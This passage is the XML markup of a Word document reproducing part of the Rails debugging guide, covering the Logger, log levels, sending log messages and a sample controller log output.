                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13151B2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BC098CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=h @post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16B25880" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="557425C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Will be rendered as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D9CB29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>[1, 2, 3, 4, 5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3553C082" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="690D022E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>Title: Rails debugging guide</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33199F70" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 The Logger</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790667C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It can also be useful to save information to log files at runtime. Rails maintains a separate log file for each runtime environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C7F9D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 What is the Logger?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C85797" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails makes use of Ruby’s standard </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to write log information. You can also substitute another logger such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Log4r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if you wish.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D51553" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can specify an alternative logger in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>environment.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or any environment file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6F82270F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="649FBFFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails.logger = Logger.new(STDOUT)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F94EE2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails.logger = Log4r::Logger.new("Application Log")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F216E2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Or in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> section, add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the following</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="505E361E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="708C7469" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.logger = Logger.new(STDOUT)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="575AC5AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.logger = Log4r::Logger.new("Application Log")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="494F068C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, each log is created under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.root/log/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the log file name is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>environment_name.log</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BB070B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Log Levels</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0A1732" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When something is logged it’s printed into the corresponding log if the log level of the message is equal or higher than the configured log level. If you want to know the current log level you can call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.logger.level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6728D013" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The available log levels are: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:warn</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:error</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:fatal</w:t>
      </w:r>
      <w:r>
        <w:t>, corresponding to the log level numbers from 0 up to 4 respectively. To change the default log level, use</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7248"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B4E114B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23C34CDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.log_level = :warn</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># In any environment initializer, or</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1668533D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails.logger.level = 0</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># at any time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3CFA44AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This is useful when you want to log under development or staging, but you don’t want to flood your production log with unnecessary information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6829D0A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default Rails log level is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in production mode and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in development and test mode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27358F46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Sending Messages</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC641A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To write in the current log use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>logger.(debug|info|warn|error|fatal)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method from within a controller, model or mailer:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7EFDB455" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CD1799C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.debug "Person attributes hash: #{@person.attributes.inspect}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B333CA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.info "Processing the request..."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37A98FC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.fatal "Terminating application, raised unrecoverable error!!!"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65FC286C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Here’s an example of a method instrumented with extra logging:</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3C63AD1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15A7A7B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BD97084" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FBE66C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06798636" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F1E75A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Post.new(params[:post])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E942557" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    logger.debug "New post: #{@post.attributes.inspect}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="246951C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    logger.debug "Post should be valid: #{@post.valid?}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7771EFBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69072051" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@post.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="516FAA9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      flash[:notice] = 'Post was successfully created.'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43F0B45B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      logger.debug "The post was saved and now the user is going to be redirected..."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0443DBCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      redirect_to(@post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A543205" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B0FCEE5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "new"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3881024E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48423F61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30864C4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B29D434" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EBEAB80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16CB64BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Here’s an example of the log generated by this method:</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A6994A6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13E416B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Processing PostsController#create (for 127.0.0.1 at 2008-09-08 11:52:54) [POST]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3047B6C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Session ID: BAh7BzoMY3NyZl9pZCIlMDY5MWU1M2I1ZDRjODBlMzkyMWI1OTg2NWQyNzViZjYiCmZsYXNoSUM6J0FjdGl</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A3BE3C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>vbkNvbnRyb2xsZXI6OkZsYXNoOjpGbGFzaEhhc2h7AAY6CkB1c2VkewA=--b18cd92fba90eacf8137e5f6b3b06c4d724596a4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="769D5FCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Parameters: {"commit"=&gt;"Create", "post"=&gt;{"title"=&gt;"Debugging Rails",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E70D22E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> "body"=&gt;"I'm learning how to print in logs!!!", "published"=&gt;"0"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="193BE3B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> "authenticity_token"=&gt;"2059c1286e93402e389127b1153204e0d1e275dd", "action"=&gt;"create", "controller"=&gt;"posts"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="299A9A86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>New post: {"updated_at"=&gt;nil, "title"=&gt;"Debugging Rails", "body"=&gt;"I'm learning how to print in logs!!!",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B26DA60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> "published"=&gt;false, "created_at"=&gt;nil}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C946A99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post should be valid: true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34CA1B44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Post Create (0.000443)   INSERT INTO "posts" ("updated_at", "title", "body", "published",</w:t>
            </w:r>
          </w:p>
